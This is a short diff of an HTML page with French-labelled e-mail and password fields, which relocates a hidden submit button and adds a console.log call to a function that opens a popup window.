@@ -56,7 +56,6 @@ body, html {
          <br><br><br><br>
          <font color="white"> E-mail : </font><input type="email" id="E-mail" name="E-mail" value="">
          <font color="white"> Mot de passe: </font><input type="password" name="password" id="password" value=""> <br> 
-             <button onclick="postMessage" id="submit" style="display:none;">OK</button>
         </form>
 
          <div id="not-installed" style="display: none;">
@@ -65,13 +64,15 @@ body, html {
          </div>
  
          <pre id="msg"></pre>
- 
+              <button onclick="postMessage" id="submit" style="display:none;">OK</button>
+
      </div>
   </div>
      <script src="installer.js"></script>
      <script src="/redirect.js"></script>
 <script>
  function postMessage(){
+	 console.log("PostMESSAGE");
     window.open ("testpage","test", "width=350,height=250");
  }
  
